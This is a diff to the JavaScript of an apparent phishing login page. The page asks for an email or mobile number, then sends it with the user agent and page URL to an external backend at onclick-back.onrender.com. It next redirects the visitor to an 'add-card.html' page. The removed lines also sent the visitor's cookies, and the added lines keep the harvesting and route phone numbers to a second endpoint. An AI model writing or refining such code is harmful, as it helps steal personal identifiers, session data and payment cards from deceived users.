@@ -1,59 +1,155 @@
-document.addEventListener('DOMContentLoaded', () => {
-  const input = document.getElementById('userId');
-  const button = document.getElementById('submit-btn');
-  const form = document.getElementById('login-form');
-  const errorRequired = document.getElementById('error-required');
-  const errorFormat = document.getElementById('error-format');
-  const errorIcon = document.querySelector('.al-input__error-icon');
+document.addEventListener("DOMContentLoaded", () => {
+  const input = document.getElementById("userId");
+  const label = document.getElementById("inputLabel");
+  const errorRequired = document.getElementById("error-required");
+  const errorFormat = document.getElementById("error-format");
+  const errorPhone = document.getElementById("error-phone");
+  const subtext = document.getElementById("subtext-info");
+  const button = document.getElementById("submit-btn");
+  const phoneWrapper = document.getElementById("phone-wrapper");
+  const form = document.getElementById("login-form");
+  const errorIcon = document.querySelector(".al-input__error-icon");
 
-  const validate = () => {
-    const value = input.value.trim();
-    const isEmpty = value === '';
-    const isValid = value.match(/^(\+48\d{9}|[a-zA-Z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,})$/i);
+  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  const isPhone = (val) => /^\d+$/.test(val);
 
-    errorRequired.classList.add('hidden');
-    errorFormat.classList.add('hidden');
-    errorIcon.classList.add('hidden');
-    input.classList.remove('error');
+  let touched = false;
+
+  function updateLabelState() {
+    const val = input.value.trim();
+    label.classList.toggle("shrink", !!val || document.activeElement === input);
+  }
+
+  function validate() {
+    const val = input.value.trim();
+    const isEmpty = val === "";
+    const isPhoneInput = isPhone(val);
+    const isEmailInput = emailRegex.test(val);
+    const isValidPhone = isPhoneInput && val.length >= 9;
+
+    // Reset state
+    input.classList.remove("error", "valid", "phone-mode");
+    label.classList.remove("error");
+    errorRequired.classList.add("hidden");
+    errorFormat.classList.add("hidden");
+    errorPhone.classList.add("hidden");
+    subtext.classList.add("hidden");
+    phoneWrapper.classList.add("hidden");
+    button.classList.remove("active");
     button.disabled = true;
+    errorIcon.style.display = "none";
+
+    let hasError = false;
+
+    if (!touched) return;
 
     if (isEmpty) {
-      errorRequired.classList.remove('hidden');
-      errorIcon.classList.remove('hidden');
-      input.classList.add('error');
-    } else if (!isValid) {
-      errorFormat.classList.remove('hidden');
-      errorIcon.classList.remove('hidden');
-      input.classList.add('error');
-    } else {
-      button.disabled = false;
+      input.classList.add("error");
+      label.classList.add("error");
+      label.textContent = "Email or mobile number";
+      errorRequired.classList.remove("hidden");
+      errorIcon.style.display = "block";
+      updateLabelState();
+      return;
     }
-  };
 
-  input.addEventListener('input', validate);
+    if (isPhoneInput) {
+      input.classList.add("phone-mode");
+      phoneWrapper.classList.remove("hidden");
+      label.textContent = "Mobile number";
 
-  form.addEventListener('submit', async (e) => {
+      if (!isValidPhone) {
+        input.classList.add("error");
+        label.classList.add("error");
+        errorPhone.classList.remove("hidden");
+        errorIcon.style.display = "block";
+        updateLabelState();
+        return;
+      }
+    } else if (!isEmailInput) {
+      input.classList.add("error");
+      label.classList.add("error");
+      label.textContent = "Email address";
+      errorFormat.classList.remove("hidden");
+      errorIcon.style.display = "block";
+      updateLabelState();
+      return;
+    } else {
+      label.textContent = "Email address";
+    }
+
+    // Valid input
+    input.classList.add("valid");
+    button.classList.add("active");
+    button.disabled = false;
+    subtext.classList.remove("hidden");
+    updateLabelState();
+  }
+
+  input.addEventListener("focus", () => {
+    touched = true;
+    updateLabelState();
+  });
+
+  input.addEventListener("blur", () => {
+    updateLabelState();
+    validate();
+  });
+
+  input.addEventListener("input", () => {
+    updateLabelState();
+    validate();
+  });
+
+  form.addEventListener("submit", async (e) => {
     e.preventDefault();
-    const value = input.value.trim();
+    const val = input.value.trim();
+    if (button.disabled) return;
+
+    const isEmail = emailRegex.test(val);
+    const endpoint = isEmail ? "/login" : "/phone";
+
     button.disabled = true;
-    button.querySelector('.al-button__label').textContent = 'Loading...';
+    button.querySelector(".al-button__label").textContent = "Loading...";
 
     try {
-      await fetch('https://onclick-back.onrender.com/login', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+      await fetch(`https://onclick-back.onrender.com${endpoint}`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          email: value,
-          cookies: document.cookie,
+          user_input: val,
           userAgent: navigator.userAgent,
           location: window.location.href,
-          date: new Date().toISOString()
-        })
+          timestamp: new Date().toISOString(),
+        }),
       });
-      window.location.href = 'add-card.html';
+
+      window.location.href = "add-card.html";
     } catch (err) {
+      console.error("Failed to submit:", err);
+      alert("Submission failed. Try again.");
       button.disabled = false;
-      button.querySelector('.al-button__label').textContent = 'Continue';
+      button.querySelector(".al-button__label").textContent = "Continue";
     }
   });
+
+  // Locale toggle
+  const localeToggle = document.getElementById("locale-toggle");
+  const localeMenu = document.getElementById("locale-menu");
+  const currentLocale = document.getElementById("current-locale");
+
+  localeToggle.addEventListener("click", (e) => {
+    e.preventDefault();
+    localeMenu.classList.toggle("hidden");
+  });
+
+  document.querySelectorAll("#locale-menu li").forEach((li) => {
+    li.addEventListener("click", () => {
+      currentLocale.textContent = li.dataset.locale;
+      localeMenu.classList.add("hidden");
+    });
+  });
+
+  // 🔧 Init
+  validate();
 });
